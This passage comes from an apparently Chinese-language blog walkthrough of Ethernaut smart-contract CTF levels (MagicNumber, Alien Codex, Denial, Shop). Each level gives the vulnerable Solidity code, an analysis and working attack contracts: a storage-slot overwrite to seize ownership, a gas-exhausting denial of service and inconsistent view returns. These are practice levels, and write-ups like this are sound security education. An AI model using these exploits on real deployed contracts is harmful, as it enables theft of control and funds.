                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202312061159713.png"
                      alt="image-20231206115936652"
                ></p>
<p>这些东西都找到了，那么利用代币合约自带的 destroy 函数就能把 ETH 返还给 creator 了。</p>
<h3 id="Expoit"><a href="#Expoit" class="headerlink" title="Expoit"></a>Expoit</h3><p>Like this：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202312061201645.png"
                      alt="image-20231206120146607"
                ></p>
<p>看看结果，成功自毁，把 0.001ETH 转给 creator 了：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202312061203613.png"
                      alt="image-20231206120347572"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202312061206447.png"
                      alt="image-20231206120608397"
                ></p>
<h2 id="18-MagicNumber"><a href="#18-MagicNumber" class="headerlink" title="18 MagicNumber"></a>18 MagicNumber</h2><h3 id="Code-5"><a href="#Code-5" class="headerlink" title="Code"></a>Code</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract MagicNum &#123;</span><br><span class="line">    address public solver;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function setSolver(address _solver) public &#123;</span><br><span class="line">        solver = _solver;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">    ____________/\\\_______/\\\\\\\\\_____        </span><br><span class="line">     __________/\\\\\_____/\\\///////\\\___       </span><br><span class="line">      ________/\\\/\\\____\///______\//\\\__      </span><br><span class="line">       ______/\\\/\/\\\______________/\\\/___     </span><br><span class="line">        ____/\\\/__\/\\\___________/\\\//_____    </span><br><span class="line">         __/\\\\\\\\\\\\\\\\_____/\\\//________   </span><br><span class="line">          _\///////////\\\//____/\\\/___________  </span><br><span class="line">           ___________\/\\\_____/\\\\\\\\\\\\\\\_ </span><br><span class="line">            ___________\///_____\///////////////__</span><br><span class="line">  */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="Description-5"><a href="#Description-5" class="headerlink" title="Description"></a>Description</h3><p>To solve this level, you only need to provide the Ethernaut with a <code>Solver</code>, a contract that responds to <code>whatIsTheMeaningOfLife()</code> with the right number.</p>
<p>Easy right? Well… there’s a catch.</p>
<p>The solver’s code needs to be really tiny. Really reaaaaaallly tiny. Like freakin’ really really itty-bitty tiny: 10 opcodes at most.</p>
<p>Hint: Perhaps its time to leave the comfort of the Solidity compiler momentarily, and build this one by hand O_o. That’s right: Raw EVM bytecode.</p>
<p>Good luck!</p>
<h3 id="Analysis-5"><a href="#Analysis-5" class="headerlink" title="Analysis"></a>Analysis</h3><p>终于，要手搓字节码了吗？</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202312061211391.jpg"
                      alt="349D63BA86A0B4F0C18295D04DCAD40D" style="zoom:67%;" 
                >

<p>这题目我这土鳖没看懂，又是<code>whatIsTheMeaningOfLife()</code>，注释里又来个数字42，两个关键词 Google 一下：</p>
<blockquote>
<p><em>42</em> is the answer to the “ultimate question of life, the universe, and everything,” a joke in Douglas Adams’s 1979 novel, <em>The Hitchhiker’s Guide to the Galaxy</em>.</p>
<p>42是“生命、宇宙和万物的终极问题”的答案，这是道格拉斯·亚当斯（Douglas Adams）1979年小说《银河系漫游指南》（The Hitchhiker’s Guide to the Galaxy）中的一个笑话。</p>
</blockquote>
<p>好好好，玩洋梗捏，鼠鼠我呀，看不懂呢。</p>
<p>回到正题，题目应该是要求我们部署一个合约，其要求是能返回数字42，且操作码数量限制在10个以内。</p>
<p>那么就需要去学习一下关于 EVM 字节码的知识，以及字节码是如何组成一个合约的。</p>
<p><a class="link"   target="_blank" rel="noopener" href="https://www.evm.codes/" >An Ethereum Virtual Machine Opcodes Interactive Reference <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   target="_blank" rel="noopener" href="https://blog.openzeppelin.com/deconstructing-a-solidity-contract-part-i-introduction-832efd2d7737" >Deconstructing a Solidity Contract —Part I: Introduction <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>现在我们知道构建一个合约的功能需要有 Runtime Opcodes，而部署它需要有 Initialization Opcodes，我们先来构造 Runtime：</p>
<table>
<thead>
<tr>
<th>字节码</th>
<th>操作码</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>602a</td>
<td>PUSH1 0x2a</td>
<td>value 要写入内存的32字节值（数字42）</td>
</tr>
<tr>
<td>6080</td>
<td>PUSH1 0x80</td>
<td>offset 要写入内存的偏移量</td>
</tr>
<tr>
<td>52</td>
<td>MSTORE</td>
<td>MSTORE(offset, value)</td>
</tr>
<tr>
<td>6020</td>
<td>PUSH1 0x20</td>
<td>size 要返回的数据大小</td>
</tr>
<tr>
<td>6080</td>
<td>PUSH1 0x80</td>
<td>offset 数据在内存中的偏移量</td>
</tr>
<tr>
<td>f3</td>
<td>RETURN</td>
<td>RETURN(offset, size)</td>
</tr>
</tbody></table>
<p>602a60805260206080f3</p>
<p>这里就是我们合约所需的功能，具体是将数字42存入内存中，就可以返回该数字了。</p>
<p>部署合约所需的 Initialization Opcodes：</p>
<table>
<thead>
<tr>
<th>字节码</th>
<th>操作码</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>600a</td>
<td>PUSH1 0x0a</td>
<td>size 要复制的字节数量（Runtime Opcodes长度10字节）</td>
</tr>
<tr>
<td>60??</td>
<td>PUSH1 0x??</td>
<td>offset 要复制的代码的偏移量</td>
</tr>
<tr>
<td>6000</td>
<td>PUSH1 0x00</td>
<td>destOffset 要复制到内存中的目标偏移量</td>
</tr>
<tr>
<td>39</td>
<td>CODECOPY</td>
<td>CODECOPY(destOffset, offset, size)</td>
</tr>
<tr>
<td>600a</td>
<td>PUSH1 0x0a</td>
<td>size 要返回的数据大小（Runtime Opcodes长度10字节）</td>
</tr>
<tr>
<td>6000</td>
<td>PUSH1 0x00</td>
<td>offset 数据在内存中的偏移量</td>
</tr>
<tr>
<td>f3</td>
<td>RETURN</td>
<td>将 Runtime Opcodes 返回给 EVM</td>
</tr>
</tbody></table>
<p>600a60??600039600a6000f3</p>
<p>部署合约的字节码后面加上它的 Runtime Opcodes，就可以部署一个合约，所以我们部署合约所需的字节码是：</p>
<p>600a60??600039600a6000f3602a60805260206080f3</p>
<p>可以看到在上面一段字节码中，Runtime Opcodes 的偏移量为12，即0x0c，那么在 Initialization Opcodes 中用问号代替的值就是0c，全部的字节码如下：</p>
<p>600a600c600039600a6000f3602a60805260206080f3</p>
<h3 id="Exploit-4"><a href="#Exploit-4" class="headerlink" title="Exploit"></a>Exploit</h3><p>直接使用 web3.js 部署合约：</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> <span class="title function_">sendTransaction</span>(&#123;</span><br><span class="line">    <span class="attr">from</span>: player,</span><br><span class="line">    <span class="attr">data</span>: 600a600c600039600a6000f3602a60805260206080f3</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202401061527430.png"
                      alt="image-20240106152718373"
                ></p>
<p>上以太坊浏览器查看，得到部署的合约地址 0xCf86935aA103893Cf4513f589D76078Ce8da24bb：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202401061529478.png"
                      alt="image-20240106152947414"
                ></p>
<p>调用题目合约的 setSolver 方法即可：</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title function_">setSolver</span>(<span class="string">&quot;0xCf86935aA103893Cf4513f589D76078Ce8da24bb&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202401061533314.png"
                      alt="image-20240106153318261"
                ></p>
<h2 id="19-Alien-Codex"><a href="#19-Alien-Codex" class="headerlink" title="19 Alien Codex"></a>19 Alien Codex</h2><h3 id="Code-6"><a href="#Code-6" class="headerlink" title="Code"></a>Code</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.5.0;</span><br><span class="line"></span><br><span class="line">import &quot;../helpers/Ownable-05.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract AlienCodex is Ownable &#123;</span><br><span class="line">    bool public contact;</span><br><span class="line">    bytes32[] public codex;</span><br><span class="line"></span><br><span class="line">    modifier contacted() &#123;</span><br><span class="line">        assert(contact);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function makeContact() public &#123;</span><br><span class="line">        contact = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function record(bytes32 _content) public contacted &#123;</span><br><span class="line">        codex.push(_content);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function retract() public contacted &#123;</span><br><span class="line">        codex.length--;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function revise(uint256 i, bytes32 _content) public contacted &#123;</span><br><span class="line">        codex[i] = _content;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="Description-6"><a href="#Description-6" class="headerlink" title="Description"></a>Description</h3><p>You’ve uncovered an Alien contract. Claim ownership to complete the level.</p>
<p> Things that might help</p>
<ul>
<li>Understanding how array storage works</li>
<li>Understanding <a class="link"   target="_blank" rel="noopener" href="https://solidity.readthedocs.io/en/v0.4.21/abi-spec.html" >ABI specifications <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li>Using a very <code>underhanded</code> approach</li>
</ul>
<h3 id="Analysis-6"><a href="#Analysis-6" class="headerlink" title="Analysis"></a>Analysis</h3><p>题目要求获取所有权，那么我们要先找到题目合约所继承的 Ownable-05.sol 合约，看看是什么。</p>
<p>去 Ethernaut 的 Github 仓库获取代码：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.5.0;</span><br><span class="line"></span><br><span class="line">contract Ownable &#123;</span><br><span class="line">    address private _owner;</span><br><span class="line"></span><br><span class="line">    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);</span><br><span class="line"></span><br><span class="line">    constructor () internal &#123;</span><br><span class="line">        _owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function owner() public view returns (address) &#123;</span><br><span class="line">        return _owner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        require(isOwner(), &quot;Ownable: caller is not the owner&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isOwner() public view returns (bool) &#123;</span><br><span class="line">        return msg.sender == _owner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function renounceOwnership() public onlyOwner &#123;</span><br><span class="line">        emit OwnershipTransferred(_owner, address(0));</span><br><span class="line">        _owner = address(0);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferOwnership(address newOwner) public onlyOwner &#123;</span><br><span class="line">        _transferOwnership(newOwner);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _transferOwnership(address newOwner) internal &#123;</span><br><span class="line">        require(newOwner != address(0), &quot;Ownable: new owner is the zero address&quot;);</span><br><span class="line">        emit OwnershipTransferred(_owner, newOwner);</span><br><span class="line">        _owner = newOwner;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>那么对于成为 owner 这件事情，我们就有头绪了，关键就是要篡改这里面的 _owner 成员变量。</p>
<p>这里需要搞清楚动态数组在 EVM 中的存储机制，首先按照存储布局规则确定一个存放该动态数组的插槽 p，这个插槽中存放的是动态数组的元素数量。而元素的值从插槽 keccak256(p) 开始存储，而 EVM 的存储只有 2^256^ 个插槽，当插槽下标大于 2^256^-1 时就会溢出到 0。由于 EVM 并不会验证数组的 ABI 编码中的长度与实际有效负载长度是否匹配，我们可以在 codex.length 为 0 的时候调用 retract() 导致数组长度下溢出，从而变成 32 字节所能存储的最大的无符号整数：2^256^-1。</p>
<p>以上是我们能对动态数组 codex 进行的操作，接下来回到实际的存储中，看看最终导致的结果：</p>
<p>按照存储布局规则，存储的顺序是 父合约的 _owner (20 Bytes)、本合约的 contact (1 Btye)、本合约的 codex (32 Bytes，实际存的是 codex.length)。那么 codex 的长度就会存在 slot1 中（即上文的 p 为 1），而 codex 的元素则会从下标为 keccak(1) 的插槽开始存储，而 codex 一个元素占 32 字节，所以一个插槽刚好存储一个元素。</p>
<p>回到刚才让 codex 下溢出的情况，codex.length 为 2^256^-1，而 keccak(1) 是一个极大的整数，所以必然会导致插槽下标溢出，导致所有的插槽都能被 codex 的长度值和元素所控制。我们看看这个情况下存储的情况：</p>
<table>
<thead>
<tr>
<th>插槽下标</th>
<th>存储内容</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>_owner 和 contact</td>
</tr>
<tr>
<td>1</td>
<td>codex.length</td>
</tr>
<tr>
<td>……</td>
<td>……</td>
</tr>
<tr>
<td>keccak(1)</td>
<td>codex[0]</td>
</tr>
<tr>
<td>……</td>
<td>……</td>
</tr>
<tr>
<td>2^256^-1</td>
<td>codex[2^256^-1-keccak(1)]</td>
</tr>
</tbody></table>
<p>很明显，如果插槽下标溢出，则 codex[2^256^-1-keccak(1)+1] 会被储存在 slot0 中，也就是可以控制 _owner 状态变量了。</p>
<h3 id="Exploit-5"><a href="#Exploit-5" class="headerlink" title="Exploit"></a>Exploit</h3><p>攻击合约如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">contract Hack &#123;</span><br><span class="line">    AlienCodex public codex;</span><br><span class="line">    bytes32 public payload;</span><br><span class="line">    uint public i;</span><br><span class="line"></span><br><span class="line">    constructor(address _target) public &#123;</span><br><span class="line">        codex = AlienCodex(_target);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        i = 2 ** 256 - 1 - uint(keccak256(abi.encode(1))) + 1;</span><br><span class="line">        payload = bytes32(uint256(uint160(tx.origin)));</span><br><span class="line">        codex.makeContact();</span><br><span class="line">        codex.retract();</span><br><span class="line">        codex.revise(i, payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202402062044128.png"
                      alt="image-20240206204425033"
                ></p>
<h2 id="20-Denial"><a href="#20-Denial" class="headerlink" title="20 Denial"></a>20 Denial</h2><h3 id="Code-7"><a href="#Code-7" class="headerlink" title="Code"></a>Code</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Denial &#123;</span><br><span class="line">    address public partner; // withdrawal partner - pay the gas, split the withdraw</span><br><span class="line">    address public constant owner = address(0xA9E);</span><br><span class="line">    uint256 timeLastWithdrawn;</span><br><span class="line">    mapping(address =&gt; uint256) withdrawPartnerBalances; // keep track of partners balances</span><br><span class="line"></span><br><span class="line">    function setWithdrawPartner(address _partner) public &#123;</span><br><span class="line">        partner = _partner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // withdraw 1% to recipient and 1% to owner</span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        uint256 amountToSend = address(this).balance / 100;</span><br><span class="line">        // perform a call without checking return</span><br><span class="line">        // The recipient can revert, the owner will still get their share</span><br><span class="line">        partner.call&#123;value: amountToSend&#125;(&quot;&quot;);</span><br><span class="line">        payable(owner).transfer(amountToSend);</span><br><span class="line">        // keep track of last withdrawal time</span><br><span class="line">        timeLastWithdrawn = block.timestamp;</span><br><span class="line">        withdrawPartnerBalances[partner] += amountToSend;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // allow deposit of funds</span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    // convenience function</span><br><span class="line">    function contractBalance() public view returns (uint256) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="Description-7"><a href="#Description-7" class="headerlink" title="Description"></a>Description</h3><p>This is a simple wallet that drips funds over time. You can withdraw the funds slowly by becoming a withdrawing partner.</p>
<p>If you can deny the owner from withdrawing funds when they call <code>withdraw()</code> (whilst the contract still has funds, and the transaction is of 1M gas or less) you will win this level.</p>
<h3 id="Analysis-7"><a href="#Analysis-7" class="headerlink" title="Analysis"></a>Analysis</h3><p>题目要求不能让 owner 拿到钱。</p>
<p>这里我第一反应是把 partner 的交易 revert 掉，但是 call 并不会检查返回值，所以即使 revert 也不会影响到给 owner 的转账。那么我们就需要在 partner 合约的 fallback 函数下文章，在这里把 gas 耗尽就可以达到目的了。</p>
<h3 id="Exploit-6"><a href="#Exploit-6" class="headerlink" title="Exploit"></a>Exploit</h3><p>攻击合约如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Denial &#123;</span><br><span class="line">    function contractBalance() external view returns (uint256);</span><br><span class="line"></span><br><span class="line">    function owner() external view returns (address);</span><br><span class="line"></span><br><span class="line">    function partner() external view returns (address);</span><br><span class="line"></span><br><span class="line">    function setWithdrawPartner(address _partner) external;</span><br><span class="line"></span><br><span class="line">    function withdraw() external;</span><br><span class="line"></span><br><span class="line">    receive() external payable;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Hack &#123;</span><br><span class="line">    Denial public myD;</span><br><span class="line"></span><br><span class="line">    constructor(address payable _target) public &#123;</span><br><span class="line">        myD = Denial(_target);</span><br><span class="line">        myD.setWithdrawPartner(address(this));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        while(true) &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在靶场上提交容器的时候，后台会调用 withdraw 方法并验证：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function validateInstance(address payable _instance, address _player) public override returns (bool) &#123;</span><br><span class="line">    _player;</span><br><span class="line">    Denial instance = Denial(_instance);</span><br><span class="line">    if (address(instance).balance &lt;= 100 wei) &#123;</span><br><span class="line">        // cheating otherwise</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    // fix the gas limit for this call</span><br><span class="line">    (bool result, ) = address(instance).call&#123;gas: 1000000&#125;(abi.encodeWithSignature(&quot;withdraw()&quot;)); // Must revert</span><br><span class="line">    return !result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202402071620819.png"
                      alt="image-20240207162032733"
                ></p>
<h2 id="21-Shop"><a href="#21-Shop" class="headerlink" title="21 Shop"></a>21 Shop</h2><h3 id="Code-8"><a href="#Code-8" class="headerlink" title="Code"></a>Code</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Buyer &#123;</span><br><span class="line">    function price() external view returns (uint256);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Shop &#123;</span><br><span class="line">    uint256 public price = 100;</span><br><span class="line">    bool public isSold;</span><br><span class="line"></span><br><span class="line">    function buy() public &#123;</span><br><span class="line">        Buyer _buyer = Buyer(msg.sender);</span><br><span class="line"></span><br><span class="line">        if (_buyer.price() &gt;= price &amp;&amp; !isSold) &#123;</span><br><span class="line">            isSold = true;</span><br><span class="line">            price = _buyer.price();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="Description-8"><a href="#Description-8" class="headerlink" title="Description"></a>Description</h3><p>Сan you get the item from the shop for less than the price asked?</p>
<p><strong>Things that might help:</strong></p>
<ul>
<li><code>Shop</code> expects to be used from a <code>Buyer</code></li>
<li>Understanding restrictions of view functions</li>
</ul>
<h3 id="Analysis-8"><a href="#Analysis-8" class="headerlink" title="Analysis"></a>Analysis</h3><p>注意不要被套入题目要求的思维定式，我们不需要以较小的 price 来绕过，而是 return 不同的 price 值。</p>
<p>看看题目后台的验证代码就知道了：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function validateInstance(address payable _instance, address) public view override returns (bool) &#123;</span><br><span class="line">    Shop _shop = Shop(_instance);</span><br><span class="line">    return _shop.price() &lt; 100;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>我们可以使题目后台合约和题目合约调用 price 时获取到不同的返回值，从而满足题目的要求。</p>
<h3 id="Exploit-7"><a href="#Exploit-7" class="headerlink" title="Exploit"></a>Exploit</h3><p>攻击合约如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Shop &#123;</span><br><span class="line">    function buy() external;</span><br><span class="line"></span><br><span class="line">    function isSold() external view returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Buyer &#123;</span><br><span class="line">    Shop public shop;</span><br><span class="line"></span><br><span class="line">    constructor(address _target) public &#123;</span><br><span class="line">        shop = Shop(_target);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function price() external view returns (uint256) &#123;</span><br><span class="line">        if (shop.isSold() == false) &#123;</span><br><span class="line">            return 100;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return 99;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        shop.buy();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202402071734294.png"
                      alt="image-20240207173423215"
                ></p>
